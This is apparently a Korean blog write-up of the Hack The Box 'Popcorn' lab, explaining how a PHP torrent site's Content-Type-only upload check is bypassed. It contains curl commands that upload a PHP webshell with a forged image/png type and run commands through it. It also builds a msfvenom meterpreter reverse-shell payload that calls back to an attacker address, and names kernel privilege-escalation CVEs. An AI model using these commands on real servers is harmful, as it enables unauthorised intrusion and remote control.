---
layout: post
title: "hack the box-popcorn"
featured-img: hack_the_box
category: Etc
summary: File Upload Bypass

---

# list 

- [Exploitation](#Exploitation)
  + curl  
  + fileupload
- [Privilege_Escalation](#Privilege_Escalation)
  + DirtyCow (CVE-2016-5195)
  + motd (CVE-2010-0832)
  + Nelson (CVE-2010-4258, CVE-2010-3850, CVE-2010-3849)
- [ETC Command](#ETC_Command)

# 0. Intro
---
`popcorn` 문제는 적절하게 파일 업로드를 필터링 하지 않는 웹서버를 통해 shell을 업로드하고 Dirty Cow 취약점을 이용하여 Privilege Escalation 하는 방법으로 해결할 수 있습니다. 

이번 포스팅에서는 curl, fileupload, python-pty-shells, measploit을 이용한 공격을 정리하겠습니다.

<a name="Exploitation"/>

# 1. Exploitation
---
nmap을 이용하여 스캔한 결과는 다음과 같습니다.

```no-highlight
# Nmap 7.70 scan initiated Sun Jun  2 04:09:12 2019 as: nmap -sC -sV -oA nmap-scripts 10.10.10.6
Nmap scan report for 10.10.10.6
Host is up (0.27s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

이 웹서버에는 파일을 업로드할 수 있는 디렉토리가 2개 존재합니다.<br>
`torrents` 디렉토리의 경우에는 파일 업로드가 불가능하지만 `upload` 디렉토리는 파일 업로드가 가능합니다.<br>

두개의 디렉토리를 비교하면서 어떠한 조건에서 파일 업로드가 가능한지 대해서 정리하고, curl 사용법에 대해서 공부할 겸 모든 HTTP Request를 굳이 불편하게 curl로 작성하겠습니다.

## 1-1. curl
---
**curl 은 command line 용 data transfer tool 입니다.** download/upload 모두 가능하며 HTTP /HTTPS /FTP /LDAP /SCP /TELNET /SMTP /POP3 등 주요한 프로토콜을 지원하며 Linux/Unix 계열 및 Windows 등 주요한 OS 에서 구동되므로 여러 플랫폼과 OS에서 유용하게 사용할 수 있습니다.<br>
**libcurl** 이라는 C 기반의 library 가 제공되므로 C/C++ 프로그램 개발시 위의 protocol 과 연계가 필요하다면 libcurl 을 사용하여 손쉽게 연계할 수 있습니다. libcurl은 PHP, ruby, PERL 및 여러 언어에 바인딩되어 있으므로 사용하는 언어나 개발환경에 맞게 libcurl 을 사용할 수 있습니다.

| option       | Description |
|:------------:|:-------------|
|-L| 서버에서 HTTP 301,302 응답이 왔을 경우 rediretion URL로 따라간다.|
|-v| 자세한 옵션 출력, HTTP Request Header를 확인할 수 있다.|
|-d| FORM, DATA를 HTTP POST method를 통해 전달한다.|
|-c| 쿠키값를 파일로 저장한다.|
|-b| 파일에서 쿠키값을 읽는다.| 


### 로그인 후 torrent 파일 업로드
---
login.php 에서 로그인에 필요한 HTML FORM을 확인하고,
HTTP POST method를 통해 로그인하고 쿠키를 얻어 cookies 파일에 저장합니다. 

얻은 쿠키를 이용해 torrents.php에 접근하여 파일 업로드에 필요한 HTML FORM을 확인하고, 
HTTP POST method를 통해 파일을 업로드합니다. 

<script id="asciicast-mcWZQOPN4EBOyxm5r12FSRGXB" 
        src="https://asciinema.org/a/mcWZQOPN4EBOyxm5r12FSRGXB.js"
        async data-autoplay="true" data-size="small" >
</script>


<details>
<summary>command fold</summary>
<div markdown="1">

```console
root@kali:~/Desktop/htb/popcorn# curl -v http://10.10.10.6/torrent/ > login1.html
; login form 확인

root@kali:~/Desktop/htb/popcorn# curl -v -L -c cookies -d "username=shin&password=1234" http://10.10.10.6/torrent/login.php > login2.html
; login 후 cookie 획득

root@kali:~/Desktop/htb/popcorn# curl -v -b cookies http://10.10.10.6/torrent/torrents.php?mode=upload > torrents.html
; torrent upload form 확인

root@kali:~/Desktop/htb/popcorn# curl -v -b cookies --form torrent=@kali-linux-2019.2-amd64.iso.torrent --form type=1 --form subtype=1 --form submit="Upload Torrent" http://10.10.10.6/torrent/torrents.php?mode=upload > torrents1.html
; torrent file 업로드
```
</div>
</details>
<br>

### Fileupload 취약점 
---
토렌트 파일에 접근하여 edit.php에서 이미지 파일을 업로드하기 위한 업로드한 torrent 파일의 해시값을 확인하고,
해당 취약점이 존재하는 upload_file.php에서 이미지를 변경하는데 필요한 HTML FORM을 확인하여, 
HTTP POST method를 통해 이미지 파일을 변경합니다.

POPCORN 문제는 dirb, gobuster와 같은 Web Directory Enumeration tool 을 사용하여 업로드되는 디렉토리를 쉽게 파악할 수 있습니다.
이미지 파일을 변경, 업로드할 시 해당 디렉토리(/torrent/upoad)에 접근하여 확인할 수 있습니다.

파일을 업로드할 때 Content-Type(MIME)는 **사용자가 분석한 값**을 서버로 전달합니다.<br>
png 파일을 업로드할 경우 Content-Type은 image/png 값으로, php 파일을 업로드할 경우 Content-Type은 application/x-php 값으로 전달하게 됩니다.

이후 소스코드에서 확인하겠지만 파일 업로드 검증 시 해당 문제는 Content-Type 값으로만 검증을 진행하기 때문에 php 파일의 Content-Type 값을 변조하는 방법으로 파일업로드를 우회할 수 있습니다.

<script id="asciicast-YNtIRhG1ABL4kriAe9TfOZrAM" 
        src="https://asciinema.org/a/YNtIRhG1ABL4kriAe9TfOZrAM.js"
        async data-autoplay="true" data-size="small" >
</script>

<details>
<summary>command fold</summary>
<div markdown="1">

```console
root@kali:~/Desktop/htb/popcorn# curl -v -b cookies "http://10.10.10.6/torrent/edit.php?mode=edit&id=4d0a31c792c5b044c0f89ca1d1bd02d7b8f35cac" > upload.html 
; image upload form 확인

root@kali:~/Desktop/htb/popcorn# curl -v -L http://10.10.10.6/torrent/upload > uploaddir1.html
; upload 디렉토리 파일 확인

root@kali:~/Desktop/htb/popcorn# curl -v -b cookies --form file=@logo.png --form submit="Submit Screenshot" "http://10.10.10.6/torre
nt/upload_file.php?mode=upload&id=4d0a31c792c5b044c0f89ca1d1bd02d7b8f35cac" > upload1.html
; 정상적인 파일 업로드 

root@kali:~/Desktop/htb/popcorn# curl -v -b cookies --form "file=@shell.php;type=image/png" --form submit="Submit Screenshot" "http://10.10.10.6/torrent/upload_file.php?mode=upload&id=4d0a31c792c5b044c0f89ca1d1bd02d7b8f35cac" > bypass.html
; WebShell 파일 업로드

root@kali:~/Desktop/htb/popcorn# curl -v -L http://10.10.10.6/torrent/upload > uploaddir1.html
; upload 디렉토리 파일 확인
root@kali:~/Desktop/htb/popcorn# curl -v  http://10.10.10.6/torrent/upload/4d0a31c792c5b044c0f89ca1d1bd02d7b8f35cac.php?shin=whoami > command.html
; WebShell에 명령어 전달
```
</div>
</details>
<br>

### reverse connection shell 생성
---
해당 문제의 웹페이지는 php 기반으로 구성되어있습니다.<br>
msfvenom을 사용하여 php shell을 생성하고 실행하여 metasploit session을 생성합니다. 

<script id="asciicast-fOEDdgHxf7UjZnJGj1iqp3W3W" 
        src="https://asciinema.org/a/fOEDdgHxf7UjZnJGj1iqp3W3W.js"
        async data-autoplay="true" data-size="small" >
</script>

<details>
<summary>command fold</summary>
<div markdown="1">

```console
root@kali:~/Desktop/htb/popcorn# msfvenom -l payloads | grep php/meterpreter_reverse_tcp
; php webshell 검색

root@kali:~/Desktop/htb/popcorn# msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f raw -o msfshell.php
; php webshell 생성

root@kali:~/Desktop/htb/popcorn# curl -s -b cookies --form "file=@msfshell.php;type=image/png" --form submit="Submit Screenshot" "http://10.10.10.6/torrent/upload_file.php?mode=upload&id=4d0a31c792c5b044c0f89ca1d1bd02d7b8f35cac" > upload.html
; webshell 업로드

root@kali:~/Desktop/htb/popcorn# msfconsole 
msf5 > use exploit/multi/handler     
msf5 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp  
; session 생성
```

</div>
</details>
<br>

## 1-2. fileupload
---

### 실행 권한
---
파일 업로드를 통해 SHELL을 올리고 실행하기 위해서는 업로드 되는 **디렉토리의 실행 권한이 존재**해야합니다.
`torrents`(토렌트 파일 디렉토리), `upload`(토렌트 이미지 디렉토리) 모두 실행 권한이 존재합니다.

<script id="asciicast-Pq3O1oe4A1QEdu4XAiChDXf8r" 
        src="https://asciinema.org/a/Pq3O1oe4A1QEdu4XAiChDXf8r.js"
        async data-autoplay="true" data-size="small" >
</script>

### DirectoryIndex 
---
**apache는 DirectoryIndex 지시어**를 사용하여 디렉토리에 접근하였을 때 기본적으로 읽을 파일을 지정할 수 있습니다. 

`torrents`의 경우 **index.php에 PHP tag(\<? ?>)**이 존재합니다.
따라서 `torrents`에 접근하였을 경우에 index.php 파일을 읽게 되고 빈 페이지를 보여주게 됩니다.<br>
**이런 경우에는 업로드 되는 파일명을 확인할 수 없으므로** 상대적으로 공격이 어려워집니다.

하지만 `upload`에는 DirectoryIndex 지시어에 설정된 파일이 존재하지 않으므로 디렉토리 목록을 확인할 수 있습니다.

<script id="asciicast-V4eTandWoFz8OVFX1Ieh3kZJd" 
        src="https://asciinema.org/a/V4eTandWoFz8OVFX1Ieh3kZJd.js"
        async data-autoplay="true" data-size="small" >
</script>

### SourceCode
---
`torrents` 디렉토리에 파일을 업로드할 때 호출되는 함수의 일부분입니다.

```php
if (isset($_FILES["torrent"]))
   {
   if ($_FILES["torrent"]["error"] != 4)
   {
      $fd = fopen($_FILES["torrent"]["tmp_name"], "rb") or die("File upload error 1\n");
      is_uploaded_file($_FILES["torrent"]["tmp_name"]) or die("File upload error 2\n");
      $alltorrent = fread($fd, filesize($_FILES["torrent"]["tmp_name"]));
      $array = BDecode($alltorrent);
      if (!isset($array))
         {
         echo "This is not a valid torrent file";
         exit;
         }
      if (!$array)
         {
         echo "This is not a valid torrent file";
         exit;
         }
      $hash = sha1(BEncode($array["info"]));
      fclose($fd);
      }
      ...
```

업로드한 파일을 `BDecode` 함수(외부라이브러리) 를 통해서 적절한 torrent 파일인지를 검증하는 단계를 거칩니다.<br>
이런 경우에는 BDecode 함수가 취약한지 분석해야하고, 취약하다면 우회해야하므로 상대적으로 공격이 어려워집니다.


반면에 `upload` 디렉토리에 파일을 업로드 할 때 호출되는 함수의 일부분은 다음과 같습니다.

```php
function upload($id)
{


  if (($_FILES["file"]["type"] == "image/gif")
  || ($_FILES["file"]["type"] == "image/jpeg")
  || ($_FILES["file"]["type"] == "image/jpg")
  || ($_FILES["file"]["type"] == "image/png")
  && ($_FILES["file"]["size"] < 100000))
    {
    if ($_FILES["file"]["error"] > 0)
      {
      echo "Return Code: " . $_FILES["file"]["error"] . "<br />";
      }
    else
      {
      // echo "Upload: $id <br />";
      echo "Upload: " . $_FILES["file"]["name"] . "<br />";

    $ext = substr(strrchr($_FILES["file"]["name"], '.'), 1);

      echo "Type: " . $_FILES["file"]["type"] . "<br />";
      echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
      // echo "Temp file: " . $_FILES["file"]["tmp_name"] . "<br />";


      if (file_exists("upload/$id.$ext" . $_FILES["file"]["name"]))
        {
        echo $_FILES["file"]["name"] . " already exists. ";
        }
      else
        {
        move_uploaded_file($_FILES["file"]["tmp_name"],
        "upload/$id.$ext");

    $addfilename=db_query("UPDATE namemap SET screenshot='$id.$ext' WHERE info_hash='$id'");

        echo "Upload Completed. <br />Please refresh to see the new screenshot.";

        }

      }
    }
  else
    {
    echo "Invalid file";
    }
```

업로드한 파일의 `Content-Type` 를 확인하는 정도로 검증을 합니다. <br>

Content-Type(MIME)는 **사용자의 브라우저가 분석한 값**을 서버로 전달합니다.<br>
따라서 Burpsuite 같은 프록시 툴을 이용하여 Content-Type 값을 변조하여 쉽게 우회할 수 있습니다.

```no-highlight
Content-Type: application/x-php -> Content-Type: image/png
```

### reference
---
1. [https://httpd.apache.org/docs/2.4/ko/mod/mod_dir.html](https://httpd.apache.org/docs/2.4/ko/mod/mod_dir.html)<br>
2. [https://www.lesstif.com/pages/viewpage.action?pageId=14745703](https://www.lesstif.com/pages/viewpage.action?pageId=14745703)

<a name="Privilege_Escalation"/>

# 2. Privilege_Escalation
---
다음 취약점 등으로 권한 상승을 할 수 있습니다.

- 2-1. DirtyCow (CVE-2016-5195)
- 2-2. motd (CVE-2010-0832)
- 2-3. Nelson (CVE-2010-4258, CVE-2010-3850, CVE-2010-3849)

<a name="ETC_Command"/>

# 3. ETC Command
---

### xclip
---
xclip을 사용하면 리눅스 터미널창에서 파일의 내용 또는 문자열 등을 파이프(\|)를 이용한 I/O 리다이렉션(redirection)을 통해 클립보드에 저장할 수 있습니다.

```console
root@kali:~/Desktop/popcorn/python-pty-shells# cat /usr/share/exploitdb/exploits/linux/local/14339.sh | xclip
```

### uname
---
시스템의 모든 정보를 출력합니다.

```console
www-data@popcorn:/home/george/.cache$ uname -a
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
```

### dkpg
---
설치된 패키지 리스트 출력

```console
www-data@popcorn:/home/george/.cache$ dpkg -l | grep -i pam
ii  libpam-modules                      1.1.0-2ubuntu1                    Pluggable Authentication Modules for PAM
ii  libpam-runtime                      1.1.0-2ubuntu1                    Runtime support for the PAM library
ii  libpam0g                            1.1.0-2ubuntu1                    Pluggable Authentication Modules library
ii  python-pam                          0.4.2-12ubuntu3                   A Python interface to the PAM library
```

### 기타 정보 열거
---
home directory에 있는 정보를 열거합니다. 사용자 목록을 확인할 때 유용합니다.

```bash
www-data@popcorn:/var/www/torrent/upload$find /home -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null| column -t
```

|filename|path|user|group|file permission(m)|
|------------|-------------|-------------|-------------|-------------|
|home                       | /home                                     |root  |  root   | 755|
|george                     | /home/george                              |george|  george | 755|
|.bash_logout               | /home/george/.bash_logout                 |george|  george | 644|
|.bashrc                    | /home/george/.bashrc                      |george|  george | 644|
|torrenthoster.zip          | /home/george/torrenthoster.zip            |george|  george | 644|
|.cache                     | /home/george/.cache                       |george|  george | 755|
|motd.legal-displayed       | /home/george/.cache/motd.legal-displayed  |george|  george | 644|
|.sudo_as_admin_successful  | /home/george/.sudo_as_admin_successful    |george|  george | 644|
|user.txt                   | /home/george/user.txt                     |george|  george | 644|
|.nano_history              | /home/george/.nano_history                |root  |  root   | 600|
|.mysql_history             | /home/george/.mysql_history               |root  |  root   | 600|
|.bash_history              | /home/george/.bash_history                |root  |  root   | 600|
|.profile                   | /home/george/.profile                     |george|  george | 644|

### reference
---
1. [ippsec popcorn](https://www.youtube.com/watch?v=NMGsnPSm8iw)